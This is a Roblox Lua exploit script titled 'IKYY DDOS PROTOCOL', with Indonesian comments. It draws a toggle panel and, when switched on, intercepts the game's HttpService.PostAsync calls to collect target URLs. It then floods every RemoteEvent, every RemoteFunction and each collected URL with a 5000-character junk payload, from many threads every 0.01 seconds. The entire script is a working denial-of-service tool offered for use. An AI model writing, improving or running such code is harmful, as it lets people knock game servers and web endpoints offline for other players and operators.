local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer

-- Cleanup
if CoreGui:FindFirstChild("IkyyDDoS_V15") then CoreGui:FindFirstChild("IkyyDDoS_V15"):Destroy() end

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "IkyyDDoS_V15"
ScreenGui.Parent = CoreGui

-- UI Helpers
local function AddCorner(p, r) local c = Instance.new("UICorner") c.CornerRadius = UDim.new(0, r) c.Parent = p end
local function MakeDraggable(f)
    local d, di, ds, sp
    f.InputBegan:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then d = true ds = i.Position sp = f.Position end end)
    f.InputChanged:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch then di = i end end)
    UserInputService.InputChanged:Connect(function(i) if i == di and d then local del = i.Position - ds f.Position = UDim2.new(sp.X.Scale, sp.X.Offset + del.X, sp.Y.Scale, sp.Y.Offset + del.Y) end end)
    UserInputService.InputEnded:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then d = false end end)
end

-- Main Frame
local Main = Instance.new("Frame")
Main.Size = UDim2.new(0, 260, 0, 180)
Main.Position = UDim2.new(0.5, -130, 0.5, -90)
Main.BackgroundColor3 = Color3.fromRGB(5, 5, 5)
Main.Parent = ScreenGui
AddCorner(Main, 20)
MakeDraggable(Main)

local Stroke = Instance.new("UIStroke")
Stroke.Thickness = 3
Stroke.Color = Color3.fromRGB(255, 0, 0)
Stroke.Parent = Main

local Title = Instance.new("TextLabel")
Title.Text = "IKYY DDOS PROTOCOL"
Title.Size = UDim2.new(1, 0, 0, 50)
Title.TextColor3 = Color3.fromRGB(255, 0, 0)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 16
Title.BackgroundTransparency = 1
Title.Parent = Main

-- DDoS Switch Component
local SwitchBtn = Instance.new("TextButton")
SwitchBtn.Size = UDim2.new(0, 180, 0, 50)
SwitchBtn.Position = UDim2.new(0.5, -90, 0.5, -10)
SwitchBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
SwitchBtn.Text = "SYSTEM IDLE"
SwitchBtn.TextColor3 = Color3.fromRGB(150, 150, 150)
SwitchBtn.Font = Enum.Font.GothamBold
SwitchBtn.TextSize = 14
SwitchBtn.Parent = Main
AddCorner(SwitchBtn, 25)

local Status = Instance.new("TextLabel")
Status.Text = "Status: Waiting for Activation"
Status.Size = UDim2.new(1, 0, 0, 30)
Status.Position = UDim2.new(0, 0, 1, -35)
Status.TextColor3 = Color3.fromRGB(100, 100, 100)
Status.Font = Enum.Font.Code
Status.TextSize = 10
Status.BackgroundTransparency = 1
Status.Parent = Main

-- DDOS LOGIC VARIABLES
local Attacking = false
local HugePayload = string.rep("0", 5000) -- Data sampah berukuran besar
local TargetURLs = {} -- Menampung URL hasil sniffer otomatis

-- INTERCEPTOR: Otomatis mencari URL Target
local old; old = hookfunction(HttpService.PostAsync, function(self, url, ...)
    if not table.find(TargetURLs, url) then table.insert(TargetURLs, url) end
    return old(self, url, ...)
end)

-- CORE DDOS ENGINE
local function ExecuteDDoS()
    while Attacking do
        -- Task Spawn membuat serangan berjalan di banyak 'thread' sekaligus (Flood)
        task.spawn(function()
            -- 1. REMOTE PACKET FLOOD
            for _, v in pairs(game:GetDescendants()) do
                if v:IsA("RemoteEvent") then
                    pcall(function()
                        v:FireServer(HugePayload) -- Membanjiri server dengan data besar
                    end)
                elseif v:IsA("RemoteFunction") then
                    task.spawn(function() pcall(function() v:InvokeServer(HugePayload) end) end)
                end
            end

            -- 2. HTTPS REQUEST FLOOD
            for _, url in pairs(TargetURLs) do
                pcall(function()
                    HttpService:PostAsync(url, HttpService:JSONEncode({["ddos"] = HugePayload}))
                end)
            end
        end)
        task.wait(0.01) -- Delay sangat rendah untuk CPU Stressing
    end
end

-- SWITCH TOGGLE
SwitchBtn.MouseButton1Click:Connect(function()
    Attacking = not Attacking
    if Attacking then
        -- Visual ON
        SwitchBtn.Text = "ATTACKING..."
        SwitchBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
        SwitchBtn.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
        Status.Text = "Status: FLOODING PACKETS"
        Status.TextColor3 = Color3.fromRGB(255, 50, 50)
        Stroke.Color = Color3.fromRGB(255, 255, 255)
        
        task.spawn(ExecuteDDoS)
    else
        -- Visual OFF
        SwitchBtn.Text = "SYSTEM IDLE"
        SwitchBtn.TextColor3 = Color3.fromRGB(150, 150, 150)
        SwitchBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
        Status.Text = "Status: Attack Aborted"
        Status.TextColor3 = Color3.fromRGB(100, 100, 100)
        Stroke.Color = Color3.fromRGB(255, 0, 0)
    end
end)

-- Rainbow Pulse for Title
RunService.RenderStepped:Connect(function()
    if Attacking then
        Title.TextColor3 = Color3.fromHSV(tick() % 1, 1, 1)
    end
end)
